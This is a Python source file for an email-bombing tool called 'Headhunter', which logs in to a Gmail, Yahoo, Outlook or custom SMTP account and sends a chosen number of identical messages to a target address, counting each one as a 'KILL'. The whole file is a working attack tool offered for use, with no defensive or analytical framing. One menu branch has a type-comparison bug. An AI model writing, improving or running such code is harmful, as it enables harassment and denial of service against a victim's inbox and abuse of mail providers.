import smtplib
import sys
from termcolor import colored


headhunter_graphic = '''
██╗  ██╗███████╗ █████╗ ██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗        ######
██║  ██║██╔════╝██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗      #   |  #
███████║█████╗  ███████║██║  ██║███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝     #____|___#
██╔══██║██╔══╝  ██╔══██║██║  ██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗     #    |   #
██║  ██║███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║      #   |  #
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ######
'''


def head():
    print(colored(headhunter_graphic, 'red'))
    print(colored('{+}=============================={ Headhunter v1.0 }============================================={+}', 'cyan'))
    print(colored('{-}============================{ Coded By: Orangeman }==========================================={-}', 'magenta'))

class email_bomb:
    count = 0

    def __init__(self):
        try:
            print(colored('STARTING...', 'red'))
            print(colored('ENTER TARGET EMAIL', 'red'))
            self.target = str(input('headhunt> '))
            print(colored('{+}=============={ ATTACK MENU }================{+}', 'red'))
            print(colored('[1] 1000', 'cyan'))
            print(colored('[2] 500', 'cyan'))
            print(colored('[3] 250', 'cyan'))
            print(colored('[4] CUSTOM', 'cyan'))
            self.mode = int(input('headhunt> '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('INVALID ANSWER')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')
    def bomb(self):
        try:
            print(colored('{+}=========={ PLANNING KILLING }========={+}', 'red'))
            self.amount = None
            if self.mode == '1':
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            elif self.mode == int(4):
                print(colored('CHOOSE CUSTOM AMOUNT OF EMAILS', 'red'))
                self.amount = int(input('headhunt> '))
            print(colored(f'\n[+]======[ YOU HAVE SELECTED MODE: {self.mode} AND {self.amount} EMAILS ]======[+]'))
        except Exception as e:
            print(f'ERROR {e}')

    def email(self):
        try:
            print(colored('{+}======={ SETTING UP EMAIL }========{+}', 'red'))
            print(colored('{+}=========={ EMAIL SERVER MENU }==========={+}', 'red'))
            print(colored('[1] Gmail', 'red'))
            print(colored('[2] Yahoo', 'red'))
            print(colored('[3] OutLook', 'red'))
            print('ENTER EMAIL SERVER OR CHOOSE PRE-MADE OPTIONS')
            self.server = str(input('headhunt> '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                print(colored('ENTER IN PORT NUMBER', 'red'))
                self.port = int(input('headhunt> '))
            if default_port == True:
                self.port = int(587)
            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp.mail.outlook.com'
            print(colored('ENTER FROM ADDRESS', 'red'))
            self.fromAddr = str(input('headhunt> '))
            print(colored('ENTER PASSWORD', 'red'))
            self.fromPwd = str(input('headhunt> '))
            print(colored('ENTER SUBJECT', 'red'))
            self.subject = str(input('headhunt> '))
            print(colored('ENTER MESSAGE', 'red'))
            self.message = str(input('headhunt> '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(colored(f'KILL: {self.count}', 'magenta'))
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(colored('\n{+}======={ ATTACKING }========={+}', 'cyan'))
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(colored('\n{+}========{ ATTACK IS DONE }========={+}', 'cyan'))
        sys.exit(0)



if __name__ == '__main__':
    head()
    bomb = email_bomb()
    bomb.bomb()
    bomb.email()
    bomb.attack()